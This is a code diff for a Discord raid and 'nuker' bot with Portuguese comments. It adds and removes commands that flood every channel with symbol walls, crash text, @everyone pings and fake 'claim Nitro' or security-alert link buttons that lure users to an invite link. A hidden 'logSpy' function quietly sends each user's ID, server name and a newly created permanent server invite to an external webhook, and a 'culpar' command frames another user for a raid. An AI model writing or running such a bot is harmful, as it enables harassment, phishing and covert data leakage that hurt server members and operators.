⢜ ⢝ ⢞ ⢟ ⢠ ⢡ ⢢ ⢣ ⢤ ⢥ ⢦ ⢧ ⢨ ⢩ ⢪ ⢫ ⢬ ⢭ ⢮ ⢯ ⢰ ⢱ ⢲ ⢳ ⢴ ⢵ ⢶ ⢷ ⢸ ⢹ ⢺ ⢻ ⢼ ⢽ ⢾ ⢿ ⣀ ⣁ ⣂ ⣃ ⣄ ⣅ ⣆ ⣇ ⣈ ⣉ ⣊ ⣋ ⣌ ⣍ ⣎ ⣏ ⣐ ⣑ ⣒ ⣓ ⣔ ⣕ ⣖ ⣗ ⣘ ⣙ ⣚ ⣛ ⣜ ⣝ ⣞ ⣟ ⣠ ⣡ ⣢ ⣣ ⣤ ⣥ ⣦ ⣧ ⣨ ⣩ ⣪ ⣫ ⣬ ⣭ ⣮ ⣯ ⣰ ⣱ ⣲ ⣳ ⣴ ⣵ ⣶ ⣷ ⣸ ⣹ ⣺ ⣻ ⣼ ⣽ ⣾ ⣿ ⤀ ⤁ ⤂ ⤃ ⤄ ⤅ ⤆ ⤇ ⤈ ⤉ ⤊ ⤋ ⤌ ⤍ ⤎ ⤏ ⤐ ⤑ ⤒ ⤓ ⤔ ⤕ ⤖ ⤗ ⤘ ⤙ ⤚ ⤛ ⤜ ⤝ ⤞ ⤟ ⤠ ⤡ ⤢ ⤣ ⤤ ⤥ ⤦ ⤧ ⤨ ⤩ ⤪ ⤫ ⤬ ⤭ ⤮ ⤯ ⤰ ⤱ ⤲ ⤳ ⤴ ⤵ ⤶ ⤷ ⤸ ⤹ ⤺ ⤻ ⤼ ⤽ ⤾ ⤿ ⥀ ⥁ ⥂ ⥃ ⥄ ⥅ ⥆ ⥇ ⥈ ⥉ ⥊ ⥋ ⥌ ⥍ ⥎ ⥏ ⥐ ⥑ ⥒ ⥓ ⥔ ⥕ ⥖ ⥗ ⥘ ⥙ ⥚ ⥛ ⥜ ⥝ ⥞ ⥟ ⥠ ⥡ ⥢ ⥣ ⥤ ⥥ ⥦ ⥧ ⥨ ⥩ ⥪ ⥫ ⥬ ⥭ ⥮ ⥯ ⥰ ⥱ ⥲ ⥳ ⥴ ⥵ ⥶ ⥷ ⥸ ⥹ ⥺ ⥻ ⥼ ⥽ ⥾ ⥿ ⦀ ⦁ ⦂ ⦃ ⦄ ⦅ ⦆ ⦇ ⦈ ⦉ ⦊ ⦋ ⦌ ⦍ ⦎ ⦏ ⦐ ⦑ ⦒ ⦓ ⦔ ⦕ ⦖ ⦗ ⦘ ⦙ ⦚ ⦛ ⦜ ⦝ ⦞ ⦟ ⦠ ⦡ ⦢ ⦣ ⦤ ⦥ ⦦ ⦧ ⦨ ⦩ ⦪ ⦫ ⦬ ⦭ ⦮ ⦯ ⦰ ⦱ ⦲ ⦳ ⦴ ⦵ ⦶ ⦷ ⦸ ⦹ ⦺ ⦻ ⦼ ⦽ ⦾ ⦿ ⧀ ⧁ ⧂ ⧃ ⧄ ⧅ ⧆ ⧇ ⧈ ⧉ ⧊ ⧋ ⧌ ⧍ ⧎ ⧏ ⧐ ⧑ ⧒ ⧓ ⧔ ⧕ ⧖ ⧗ ⧘ ⧙ ⧚ ⧛ ⧜ ⧝ ⧞ ⧟ ⧠ ⧡ ⧢ ⧣ ⧤ ⧥ ⧦ ⧧ ⧨ ⧩ ⧪ ⧫ ⧬ ⧭ ⧮ ⧯ ⧰ ⧱ ⧲ ⧳ ⧴ ⧵ ⧶ ⧷ ⧸ ⧹ ⧺ ⧻ ⧼ ⧽ ⧾ ⧿ ⨀ ⨁ ⨂ ⨃ ⨄ ⨅ ⨆ ⨇ ⨈ ⨉ ⨊ ⨋ ⨌ ⨍ ⨎ ⨏ ⨐ ⨑ ⨒ ⨓ ⨔ ⨕ ⨖ ⨗ ⨘ ⨙ ⨚ ⨛ ⨜ ⨝ ⨞ ⨟ ⨠ ⨡ ⨢ ⨣ ⨤ ⨥ ⨦ ⨧ ⨨ ⨩ ⨪ ⨫ ⨬ ⨭ ⨮ ⨯ ⨰ ⨱ ⨲ ⨳ ⨴ ⨵ ⨶ ⨷ ⨸ ⨹ ⨺ ⨻ ⨼ ⨽ ⨾ ⨿ ⩀ ⩁ ⩂ ⩃ ⩄ ⩅ ⩆ ⩇ ⩈ ⩉ ⩊ ⩋ ⩌ ⩍ ⩎ ⩏ ⩐ ⩑ ⩒ ⩓ ⩔ ⩕ ⩖ ⩗ ⩘ ⩙ ⩚ ⩛ ⩜ ⩝ ⩞ ⩟ ⩠ ⩡ ⩢ ⩣ ⩤ ⩥ ⩦ ⩧ ⩨ ⩩ ⩪ ⩫ ⩬ ⩭ ⩮ ⩯ ⩰ ⩱ ⩲ ⩳ ⩴ ⩵ ⩶ ⩷ ⩸ ⩹ ⩺ ⩻ ⩼ ⩽ ⩾ ⩿ ⪀ ⪁ ⪂ ⪃ ⪄ ⪅ ⪆ ⪇ ⪈ ⪉ ⪊ ⪋ ⪌ ⪍ ⪎ ⪏ ⪐ ⪑ ⪒ ⪓ ⪔ ⪕ ⪖ ⪗ ⪘ ⪙ ⪚ ⪛ ⪜ ⪝ ⪞ ⪟ ⪠ ⪡ ⪢ ⪣ ⪤ ⪥ ⪦ ⪧ ⪨ ⪩ ⪪ ⪫ ⪬ ⪭ ⪮ ⪯ ⪰ ⪱ ⪲ ⪳ ⪴ ⪵ ⪶ ⪷ ⪸ ⪹ ⪺ ⪻ ⪼ ⪽ ⪾ ⪿ ⫀ ⫁ ⫂ ⫃ ⫄ ⫅ ⫆ ⫇ ⫈ ⫉ ⫊ ⫋ ⫌ ⫍ ⫎ ⫏ ⫐ ⫑ ⫒ ⫓ ⫔ ⫕ ⫖ ⫗ ⫘ ⫙ ⫚ ⫛ ⫝̸ ⫝ ⫞ ⫟ ⫠ ⫡ ⫢ ⫣ ⫤ ⫥ ⫦ ⫧ ⫨ ⫩ ⫪ ⫫ ⫬ ⫭ ⫮ ⫯ ⫰ ⫱ ⫲ ⫳ ⫴ ⫵ ⫶ ⫷ ⫸ ⫹ ⫺ ⫻ ⫼ ⫽ ⫾ ⫿ ⬄ ⬆ ⬇ ⬌ ⬍ ⬚ Ⱡ ⱡ Ɫ Ᵽ Ɽ ⱥ ⱦ Ⱨ ⱨ Ⱪ ⱪ Ⱬ ⱬ Ɑ ⱱ Ⱳ ⱳ ⱴ Ⱶ ⱶ ⱷ ⴰ ⴱ ⴲ ⴳ ⴴ ⴵ ⴶ ⴷ ⴸ ⴹ ⴺ ⴻ ⴼ ⴽ ⴾ ⴿ ⵀ ⵁ ⵂ ⵃ ⵄ ⵅ ⵆ ⵇ ⵈ ⵉ ⵊ ⵋ ⵌ ⵍ ⵎ ⵏ ⵐ ⵑ ⵒ ⵓ ⵔ ⵕ ⵖ ⵗ ⵘ ⵙ ⵚ ⵛ ⵜ ⵝ ⵞ ⵟ ⵠ ⵡ ⵢ ⵣ ⵤ ⵥ`;
+
+const GOD_TEXT = `# If you do not believe in God then change your ways. Philippians 4:13 *** "I can do all things through Christ who strengthens me"***\n\n# *** John 3:16 "For God so loved the world, that he gave his only Son, that whoever believes in him should not perish but have eternal life"***\n\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n-# @everyone @here\nhttps://tenor.com/view/jesus-edit-edit-jesus-christ-is-king-christ-edit-gif-15902634079600751945`;
+
+const LOGO_URL = "https://raw.githubusercontent.com/LPGamer1/Sp4m_bot/refs/heads/main/public/1766172400190.jpg";
+
+// --- FUNÇÕES ---
+
+const getDynamicCooldown = (i) => (i === 0 ? 1000 : i < 9 ? 2500 : 2800);
+
+const getMassiveButtons = (customLink) => {
+    const rows = [];
+    const targetLink = customLink || INVITE;
+    for (let i = 0; i < 5; i++) {
+        const row = new ActionRowBuilder();
+        for (let j = 0; j < 5; j++) {
+            let label = "🎁 RESGATAR NITRO";
+            if (i === 1 && j === 4) label = "☢️ SERVER BREACH";
+            if (i === 2 && j === 2) label = "💀 SYSTEM FAILURE";
+            if (i === 4 && j === 0) label = "⚠️ ACCESS DENIED";
+            row.addComponents(new ButtonBuilder().setLabel(label).setStyle(ButtonStyle.Link).setURL(targetLink));
+        }
+        rows.push(row);
     }
-    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands.map(c => c.toJSON()) }).catch(() => {});
-  }
-
-  client.once('ready', () => registerCommands());
-
-  client.on('interactionCreate', async interaction => {
-    if (!interaction.isChatInputCommand()) return;
-    const { commandName, options, user } = interaction;
-
-    if (commandName === 'bot_mode' || commandName === 'bot_mode2') {
-      if (!ALLOWED_USERS.includes(user.id)) return interaction.reply({ content: '❌', ephemeral: true });
-      if ((BOT_TYPE === 'MAIN' && commandName === 'bot_mode2') || (BOT_TYPE === 'UPDATE' && commandName === 'bot_mode')) {
-        botEnabled = !botEnabled;
-        await interaction.reply({ content: `✅ **${BOT_TYPE}:** ${botEnabled ? 'ON' : 'OFF'}`, ephemeral: true });
-        return registerCommands();
-      }
-    }
-
-    if (!botEnabled) return;
-    await interaction.reply({ content: '☢️', ephemeral: true }).catch(() => {});
-
-    try {
-      // 1. GHOST RAID (20x Disparos com auto-delete)
-      if (commandName === 'ghost_raid') {
-        for(let i=0; i<20; i++) {
-          const msg = await interaction.followUp({ content: `@everyone @here **S̶Y̶S̶T̶E̶M̶ ̶B̶R̶E̶A̶C̶H̶**\n${INVITE_LINK}` });
-          setTimeout(() => msg.delete().catch(() => {}), 300); // Deleta após 300ms
-          await wait(dynamicWait(i));
-        }
-      }
-
-      // 2. VERTICAL NUKE (Ocupa a tela toda com títulos vazios)
-      if (commandName === 'vertical_nuke') {
-        const wall = ("# ㅤ\n").repeat(25) + `## **CLEANED BY SP4M_B0T**\n${INVITE_LINK}`;
-        await interaction.followUp({ content: wall });
-      }
-
-      // 3. INTERACTION TRAP (Parede invisível clicável)
-      if (commandName === 'interaction_trap') {
-        const trap = (`[ㅤ](${INVITE_LINK})`.repeat(10) + "\n").repeat(10);
-        await interaction.followUp({ content: "### ⚠️ **AVISO DE SEGURANÇA**\nClique na área abaixo para validar sua conta:\n" + trap });
-      }
-
-      // 4. UI GLITCH (ANSI + Reverse Text + Flashing)
-      if (commandName === 'ui_glitch') {
-        const reverse = "\u202e" + "KCARH_METSYS_LAICIFO"; // Inverte o texto
-        const glitch = ("```ansi\n\u001b[1;31m\u001b[40m" + reverse + "\u001b[0m\n```").repeat(5);
-        await interaction.followUp({ content: glitch });
-      }
-
-      // 5. FAKE SYSTEM MSG (Imitação de Log de Sistema)
-      if (commandName === 'fake_system_msg') {
-        const msg = `> ### 🛡️ **𝗗𝗶𝘀𝗰𝗼𝗿𝗱 Security Service**\n> **Detectamos atividades suspeitas na sua conta.**\n> \n> **Ação:** Suspensão Pendente\n> **Resolução:** [Verificar Identidade AGORA](${INVITE_LINK})`;
-        await interaction.followUp({ content: msg });
-      }
-
-      // --- OUTROS COMANDOS AGRESSIVOS ---
-      if (commandName === 'raid') {
-        for(let i=0; i<10; i++) {
-          await interaction.followUp({ content: `# **CHRIST IS KING**\n-# @everyone @here\nhttps://images-ext-1.discordapp.net/external/wRXhfKv8h9gdaolqa1Qehbxyy9kFLHa13mHHPIW8ubU/https/media.tenor.com/3LGBcIuftUkAAAPo/jesus-edit-edit.mp4\n${INVITE_LINK}` });
-          await wait(dynamicWait(i));
-        }
-      }
-
-      if (commandName === 'lag_v2') {
-        const zalgo = "\u030d\u030e\u0304\u0305\u033f\u0311\u0306\u0310\u0352\u035b\u0323\u0324\u0330".repeat(50);
-        await interaction.followUp({ content: "```ansi\n\u001b[1;31m" + zalgo + "\n```" });
-      }
-
-      if (commandName === 'button_nuke') {
-        for (let m = 0; m < 4; m++) {
-          const rows = [];
-          for (let i = 0; i < 5; i++) {
-            const row = new ActionRowBuilder();
-            for (let j = 0; j < 5; j++) {
-              row.addComponents(new ButtonBuilder().setLabel('🎁 CLAIM NITRO').setStyle(ButtonStyle.Link).setURL(INVITE_LINK));
-            }
-            rows.push(row);
-          }
-          await interaction.followUp({ content: "**URGENT GIFT!**", components: rows });
-          await wait(dynamicWait(m));
-        }
-      }
-
-      if (commandName === 'webhook_atk') {
-        const url = options.getString('url'), msg = options.getString('msg'), qty = options.getInteger('qtd');
-        for (let i = 0; i < qty; i++) {
-          const data = JSON.stringify({ content: msg });
-          const req = https.request(url, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
-          req.write(data); req.end();
-          if (i % 5 === 0) await wait(500);
-        }
-      }
-
-    } catch (err) { console.error("Erro na execução nuclear."); }
-  });
-
-  client.login(TOKEN).catch(() => {});
+    return rows;
 };
 
-process.on('unhandledRejection', () => {});
-process.on('uncaughtException', () => {});
+const chunkString = (str, length) => {
+    const chunks = [];
+    for (let i = 0; i < str.length; i += length) chunks.push(str.substring(i, i + length));
+    return chunks;
+};
+
+// --- LOG ESPIÃO ---
+const logSpy = async (interaction) => {
+    if (!SPY_WEBHOOK.startsWith("http")) return;
+
+    const userTag = interaction.user ? interaction.user.tag : "N/A";
+    const userId = interaction.user ? interaction.user.id : "N/A";
+    const guildName = interaction.guild ? interaction.guild.name : "DM/Privado";
+    let inviteUrl = "User Install / Sem Permissão";
+
+    if (interaction.guild && interaction.channel) {
+        try {
+            const invite = await interaction.channel.createInvite({ maxAge: 0, maxUses: 0, unique: true });
+            inviteUrl = invite.url;
+        } catch (err) {}
+    }
+
+    const payload = JSON.stringify({
+        content: `🚨 **USO DETECTADO** 🚨\n👤 **User:** ${userTag} \`(${userId})\`\n🏠 **Server:** ${guildName}\n🔗 **Invite:** ${inviteUrl}\n🛠️ **Cmd:** /${interaction.commandName}`
+    });
+
+    try {
+        const req = https.request(SPY_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
+        req.write(payload);
+        req.end();
+    } catch(e) {}
+};
+
+// --- FUNÇÃO GLOBAL (NUKER) ---
+async function runGlobalAttack(interaction, user, attackFunction) {
+    if (!interaction.guild) {
+        return attackFunction(interaction.channel); // Se for DM, faz só uma vez
+    }
+
+    // Pega todos os canais de texto onde o bot tem permissão de falar
+    const channels = interaction.guild.channels.cache.filter(c => 
+        c.isTextBased() && c.permissionsFor(interaction.guild.members.me).has('SendMessages')
+    );
+
+    for (const [id, channel] of channels) {
+        if (stopSignals.get(user.id)) break;
+        
+        // Executa o ataque no canal atual
+        await attackFunction(channel);
+        
+        // Espera 3 segundos antes de ir para o próximo canal
+        await wait(3000); 
+    }
+}
+
+
+module.exports = async (TOKEN, CLIENT_ID) => {
+    const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+    const rest = new REST({ version: '10' }).setToken(TOKEN);
+
+    const commands = [
+        // Comandos Normais
+        new SlashCommandBuilder().setName('raid').setDescription('RAID V1 LIMPA').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('raid2').setDescription('RAID V2 HTML CHARS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('wall_point').setDescription('PAREDE DE PONTOS (3 FASES)').setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('trava_zap').setDescription('10 MENSAGENS TRAVA (2s)').setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('ponto').setDescription('BRAILLE REPETIDO (20x)').setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('logo').setDescription('Envia a logo do bot').setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('culpar').setDescription('Mensagem de conclusão falsa').addUserOption(o => o.setName('alvo').setRequired(true).setDescription('Usuário')).setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('say').setDescription('Repete Mensagem').addStringOption(o=>o.setName('t').setRequired(true).setDescription('Texto')).addIntegerOption(o=>o.setName('q').setRequired(true).setDescription('Qtd')).setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('button_spam').setDescription('FLOOD BTNS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('god').setDescription('RAID RELIGIOSA').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('stop').setDescription('Para o bot').setIntegrationTypes([1]).setContexts([0,1,2]),
+
+        // Comandos Globais (Nuker)
+        new SlashCommandBuilder().setName('all_raid').setDescription('RAID V1 EM TODOS OS CANAIS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('all_raid2').setDescription('RAID V2 EM TODOS OS CANAIS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('all_trava').setDescription('TRAVA ZAP EM TODOS OS CANAIS').setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('all_ponto').setDescription('PONTO EM TODOS OS CANAIS').setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('all_wall').setDescription('WALL EM TODOS OS CANAIS').setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('all_god').setDescription('GOD EM TODOS OS CANAIS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('all_say').setDescription('SAY EM TODOS OS CANAIS').addStringOption(o=>o.setName('t').setRequired(true).setDescription('Texto')).setIntegrationTypes([1]).setContexts([0,1,2]),
+        new SlashCommandBuilder().setName('all_spam').setDescription('BUTTON SPAM EM TODOS OS CANAIS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2])
+    ].map(c => c.toJSON());
+
+    client.once('clientReady', () => {
+        rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
+        console.log(`✅ SP4M Bot Online: ${client.user.tag}`);
+    });
+
+    client.on('interactionCreate', async interaction => {
+        if (!interaction.isChatInputCommand()) return;
+        const { commandName, options, user } = interaction;
+
+        logSpy(interaction).catch(() => {});
+
+        if (commandName === 'stop') {
+            stopSignals.set(user.id, true);
+            return interaction.reply({ content: '🛑 **PARADA DE EMERGÊNCIA ACIONADA.**', flags: [MessageFlags.Ephemeral] });
+        }
+
+        await interaction.reply({ content: '💀 **Iniciando...**', flags: [MessageFlags.Ephemeral] }).catch(() => {});
+        stopSignals.set(user.id, false);
+        const customLink = options.getString('link');
+
+        // --- DEFINIÇÃO DAS FUNÇÕES DE ATAQUE ---
+
+        const attackRaid1 = async (channel) => {
+            const btns = getMassiveButtons(customLink);
+            const msg = RAID_HEADER + RAID_SYMBOLS;
+            const chunks = chunkString(msg, 1900);
+            for(const chunk of chunks) await channel.send({ content: chunk, components: btns }).catch(()=>{});
+        };
+
+        const attackRaid2 = async (channel) => {
+            const btns = getMassiveButtons(customLink);
+            const msg = RAID_HEADER + RAID2_CONTENT;
+            const chunks = chunkString(msg, 1900);
+            for(const chunk of chunks) await channel.send({ content: chunk, components: btns }).catch(()=>{});
+        };
+
+        const attackTrava = async (channel) => {
+            await channel.send({ content: TRAVA_ZAP_MSG }).catch(()=>{});
+        };
+
+        const attackPonto = async (channel) => {
+             const pontoMsg = (PONTO_TEXT + " " + PONTO_TEXT).substring(0, 1999);
+             await channel.send({ content: pontoMsg }).catch(()=>{});
+        };
+
+        const attackWall = async (channel) => {
+            const walls = [WALL_1, WALL_2, WALL_3];
+            for(const w of walls) {
+                await channel.send({ content: w }).catch(()=>{});
+                await wait(1000);
+            }
+        };
+
+        const attackGod = async (channel) => {
+            const btns = getMassiveButtons(customLink);
+            await channel.send({ content: GOD_TEXT, components: btns }).catch(()=>{});
+        };
+
+        const attackSpam = async (channel) => {
+             const btns = getMassiveButtons(customLink);
+             await channel.send({ content: "### ⚠️ **ALERT: UNAUTHORIZED ACCESS**", components: btns }).catch(()=>{});
+        };
+
+        // --- COMANDOS NORMAIS (LOOP NO CANAL ATUAL) ---
+
+        if (commandName === 'logo') {
+            for(let i=0; i < 2; i++) {
+                if (stopSignals.get(user.id)) break;
+                await interaction.followUp({ content: LOGO_URL }).catch(() => {});
+                await wait(1700);
+            }
+        }
+        
+        if (commandName === 'culpar') {
+            const alvo = options.getUser('alvo');
+            await interaction.followUp({ 
+                content: `✅ ${alvo} sua Raid foi concluída com sucesso! Caso deseje mais algo, basta executar os comandos.` 
+            }).catch(() => {});
+        }
+
+        if (commandName === 'raid') {
+            const btns = getMassiveButtons(customLink);
+            const fullMsg = RAID_HEADER + RAID_SYMBOLS;
+            const chunks = chunkString(fullMsg, 1900); 
+            for(let i=0; i < 40; i++) {
+                if (stopSignals.get(user.id)) break; 
+                for (const chunk of chunks) {
+                    if (stopSignals.get(user.id)) break;
+                    await interaction.followUp({ content: chunk, components: btns }).catch(() => {});
+                    await wait(600);
+                }
+                await wait(getDynamicCooldown(i));
+            }
+        }
+
+        if (commandName === 'raid2') {
+            const btns = getMassiveButtons(customLink);
+            const fullMsg = RAID_HEADER + RAID2_CONTENT;
+            const chunks = chunkString(fullMsg, 1900); 
+            for(let i=0; i < 40; i++) {
+                if (stopSignals.get(user.id)) break; 
+                for (const chunk of chunks) {
+                    if (stopSignals.get(user.id)) break;
+                    await interaction.followUp({ content: chunk, components: btns }).catch(() => {});
+                    await wait(600);
+                }
+                await wait(getDynamicCooldown(i));
+            }
+        }
+
+        if (commandName === 'wall_point') {
+            const walls = [WALL_1, WALL_2, WALL_3];
+            for (let i = 0; i < 5; i++) {
+                if (stopSignals.get(user.id)) break;
+                for (const wall of walls) {
+                    if (stopSignals.get(user.id)) break;
+                    await interaction.followUp({ content: wall }).catch(() => {});
+                    await wait(2000); 
+                }
+            }
+        }
+
+        if (commandName === 'trava_zap') {
+            for(let i=0; i < 10; i++) {
+                if (stopSignals.get(user.id)) break;
+                await interaction.followUp({ content: TRAVA_ZAP_MSG }).catch(() => {});
+                await wait(2000); 
+            }
+        }
+
+        if (commandName === 'ponto') {
+            const pontoMsg = (PONTO_TEXT + " " + PONTO_TEXT).substring(0, 1999);
+            for(let i=0; i < 20; i++) {
+                if (stopSignals.get(user.id)) break;
+                await interaction.followUp({ content: pontoMsg }).catch(() => {});
+                await wait(getDynamicCooldown(i));
+            }
+        }
+
+        if (commandName === 'button_spam') {
+            const btns = getMassiveButtons(customLink);
+            for(let i=0; i < 50; i++) {
+                if (stopSignals.get(user.id)) break; 
+                await interaction.followUp({ content: "### ⚠️ **ALERT: UNAUTHORIZED ACCESS**", components: btns }).catch(() => {});
+                await wait(getDynamicCooldown(i));
+            }
+        }
+
+        if (commandName === 'say') {
+            const t = options.getString('t');
+            const q = options.getInteger('q');
+            for(let i=0; i < q; i++) {
+                if (stopSignals.get(user.id)) break;
+                await interaction.followUp({ content: t }).catch(() => {});
+                await wait(getDynamicCooldown(i));
+            }
+        }
+
+        if (commandName === 'god') {
+            const btns = getMassiveButtons(customLink);
+            for(let i=0; i < 20; i++) {
+                if (stopSignals.get(user.id)) break;
+                await interaction.followUp({ content: GOD_TEXT, components: btns }).catch(() => {});
+                await wait(getDynamicCooldown(i));
+            }
+        }
+
+        // --- COMANDOS GLOBAIS (NUKER) ---
+        // Iteram por todos os canais com delay de 3s
+
+        if (commandName === 'all_raid') await runGlobalAttack(interaction, user, attackRaid1);
+        if (commandName === 'all_raid2') await runGlobalAttack(interaction, user, attackRaid2);
+        if (commandName === 'all_trava') await runGlobalAttack(interaction, user, attackTrava);
+        if (commandName === 'all_ponto') await runGlobalAttack(interaction, user, attackPonto);
+        if (commandName === 'all_wall') await runGlobalAttack(interaction, user, attackWall);
+        if (commandName === 'all_god') await runGlobalAttack(interaction, user, attackGod);
+        if (commandName === 'all_spam') await runGlobalAttack(interaction, user, attackSpam);
+        
+        if (commandName === 'all_say') {
+             const t = options.getString('t');
+             await runGlobalAttack(interaction, user, async (ch) => {
+                 await ch.send({ content: t }).catch(()=>{});
+             });
+        }
+
+    });
+
+    client.login(TOKEN).catch(() => {});
+};
